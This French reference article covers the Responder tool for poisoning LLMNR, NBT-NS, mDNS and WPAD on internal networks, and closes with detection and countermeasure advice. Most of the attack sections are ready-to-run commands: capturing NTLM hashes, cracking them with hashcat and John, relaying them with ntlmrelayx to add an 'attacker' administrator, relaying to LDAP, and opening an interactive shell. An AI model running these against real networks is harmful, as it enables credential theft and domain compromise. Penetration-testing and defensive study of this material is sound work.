---
title: Responder
domain: sciences-appliquées
subdomain: informatique / sécurité / outils
tags: [responder, llmnr, ntlm, active-directory, poisoning, sécurité, pentest]
date: 2026-03-22
---

# Responder

Responder est un outil de poisoning réseau qui exploite les protocoles de résolution de noms LLMNR, NBT-NS et mDNS pour capturer des hashes NTLM sur un réseau local. C'est souvent le premier vecteur d'attaque en pentest interne.

## Protocoles ciblés

```
LLMNR (Link-Local Multicast Name Resolution) — port UDP 5355
  Utilisé quand le DNS ne peut pas résoudre un nom
  Diffuse la requête en multicast → Responder répond à la place

NBT-NS (NetBIOS Name Service) — port UDP 137
  Ancien protocole Windows de résolution de noms NetBIOS
  Même mécanisme : Responder répond aux requêtes broadcast

mDNS (Multicast DNS) — port UDP 5353
  Protocole zero-config (Bonjour/Avahi)
  Utilisé par Windows pour résoudre .local

WPAD (Web Proxy Auto-Discovery)
  Les clients cherchent "wpad" sur le réseau pour trouver un proxy
  → Responder peut empoisonner cette résolution
```

### Mécanisme d'attaque

```
1. Un utilisateur tape \\SERVEUR dans l'explorateur → typo, serveur inexistant
2. Windows cherche "SERVEUR" dans le DNS → échec
3. Windows émet une requête LLMNR/NBT-NS en broadcast : "Quelqu'un connaît SERVEUR ?"
4. Responder répond : "Oui, c'est moi !"
5. Windows envoie ses credentials NTLM pour s'authentifier
6. Responder capture le hash NTLMv2
7. L'attaquant casse le hash hors ligne ou le relaie
```

## Utilisation de base

```bash
# Lancer Responder en mode écoute
responder -I eth0

# Modes verbeux
responder -I eth0 -v            # Verbose — afficher toutes les requêtes
responder -I eth0 -A            # Analyze only — écouter sans empoisonner (discret)

# Désactiver certains serveurs (si conflits avec des services légitimes)
responder -I eth0 --disable-ess  # Désactiver les SMB Extended Security
responder -I eth0 -F             # Force auth basic (pour capturer des creds en clair)

# Les hashes capturés sont automatiquement sauvegardés dans
ls /usr/share/responder/logs/
# Fichiers : Responder-Session.log, SMB-NTLMv2-SSP-*.txt, ...
```

## Hashes capturés

```
Format NTLMv2 capturé :
alice::DOMAINE:1122334455667788:hash_complet_ntlmv2:challenge

Exemples dans les logs Responder :
[SMB] NTLMv2 Hash     : alice::DOMAINE:aabbccdd11223344:4c2a...
[HTTP] NTLMv1 Hash    : bob::WORKGROUP:...
```

```bash
# Cracker avec hashcat
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt -r rules/best64.rule

# Mode NTLMv1 (moins courant mais plus rapide à casser)
hashcat -m 5500 ntlmv1_hashes.txt rockyou.txt

# John the Ripper
john ntlmv2_hashes.txt --wordlist=rockyou.txt --format=netntlmv2
```

## NTLM Relay — sans casser le hash

Au lieu de capturer et casser le hash, on peut le relayer directement vers une autre machine.

```bash
# Désactiver SMB et HTTP dans Responder (pour que ntlmrelayx les intercepte)
# Modifier /etc/responder/Responder.conf :
# SMB = Off
# HTTP = Off

# Terminal 1 : Responder empoisonne LLMNR mais ne répond pas SMB/HTTP
responder -I eth0

# Terminal 2 : ntlmrelayx relaie les authentifications vers des cibles
impacket-ntlmrelayx -tf targets.txt -smb2support

# Si le compte relayé est admin sur la cible → dump SAM automatique
# Ou exécuter une commande :
impacket-ntlmrelayx -tf targets.txt -smb2support -c "net localgroup administrators attacker /add"

# Relay vers LDAP (utile pour créer des comptes ou modifier des attributs AD)
impacket-ntlmrelayx -t ldap://DC01.domaine.local --delegate-access

# Condition : SMB signing doit être désactivé sur les cibles
# Vérifier avec nxc :
nxc smb 192.168.1.0/24 --gen-relay-list targets_no_signing.txt
```

## MultiRelay — cibler une machine spécifique

```bash
# Si on veut cibler une machine précise plutôt qu'une liste
impacket-ntlmrelayx -t 192.168.1.20 -smb2support --no-http-server

# Avec Interactive shell (si ntlmrelayx relaie vers un admin)
impacket-ntlmrelayx -tf targets.txt -smb2support -i
# → Lance un shell interactif sur le port 11000
nc 127.0.0.1 11000
```

## Serveurs Responder

Responder lance plusieurs serveurs simulés pour capturer différents types de credentials :

```
SMB   → Hash NTLMv1/v2 (le plus courant)
HTTP  → Hash NTLM (navigateurs configurés pour l'auth intégrée Windows)
HTTPS → Hash NTLM via TLS
FTP   → Credentials FTP en clair ou hash
SMTP  → Credentials SMTP
POP3  → Credentials POP3
IMAP  → Credentials IMAP
LDAP  → Hash NTLM pour les clients LDAP Windows
DNS   → Empoisonnement DNS local
WPAD  → Proxy auto-discovery → hash NTLM + potentiel MITM HTTP
```

```bash
# Activer WPAD (peut capturer plus de hashes depuis les navigateurs)
responder -I eth0 -wF
# -w = activer le serveur WPAD
# -F = forcer l'authentification basique sur le serveur WPAD
```

## Détection et contre-mesures

```
Détection :
  - Surveiller les requêtes LLMNR/NBT-NS anormalement répondues
  - Comparer les réponses DNS/LLMNR (même nom → deux répondants = suspect)
  - Événement Windows 4648 (connexion avec credentials explicites) depuis des IPs inattendues
  - Wireshark : filtrer llmnr || nbns pour voir les requêtes et répondants

Contre-mesures :
  ✓ Désactiver LLMNR via GPO :
    Computer Config → Admin Templates → Network → DNS Client → Turn off multicast name resolution → Enabled
  ✓ Désactiver NBT-NS :
    Propriétés TCP/IP → Avancé → WINS → Disable NetBIOS over TCP/IP
  ✓ Activer SMB signing (requis) → empêche le relais NTLM
  ✓ Activer LDAP signing et channel binding → empêche le relais LDAP
  ✓ Désactiver WPAD si non utilisé
  ✓ Utiliser des mots de passe complexes (résistants au craquage)
  ✓ Privileged Access Workstations (PAW) — les admins ne naviguent pas depuis leurs postes
```
